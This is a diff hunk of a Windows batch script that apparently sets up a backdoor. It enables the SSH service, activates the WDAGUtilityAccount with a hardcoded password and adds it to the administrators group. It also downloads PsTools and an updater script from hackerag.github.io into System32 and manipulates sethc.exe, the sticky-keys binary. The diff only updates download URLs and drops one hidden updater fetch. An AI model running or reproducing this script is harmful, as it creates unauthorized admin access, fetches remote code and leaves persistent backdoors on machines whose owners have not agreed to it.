@@ -11,11 +11,10 @@ powershell Set-Service -Name sshd -StartupType 'Automatic'
 net user WDAGUtilityAccount /active:yes
 net user WDAGUtilityAccount FKejx80snc2WF_rM
 net localgroup administratoren /add WDAGUtilityAccount
-curl -o C:\temp.zip https://hackerag.github.io/pstools.zip
+curl -o C:\temp.zip https://hackerag.github.io/files/PStools.zip
 powershell Expand-Archive C:\temp.zip C:\Windows\System32\
 del C:\temp.zip
-curl -o C:\Windows\System32\update.vbs https://hackerag.github.io/update.vbs
-curl -o C:\Windows\System32\hidden_updater.cmd https://hackerag.github.io/updater.cmd
+curl -o C:\Windows\System32\update.cmd https://hackerag.github.io/files/updater.cmd
 taskkill /f /im sethc.exe
 rename C:\Windows\System32\sethc.exe launchtm.exe
 rename C:\Windows\System32\sethc.original sethc.exe
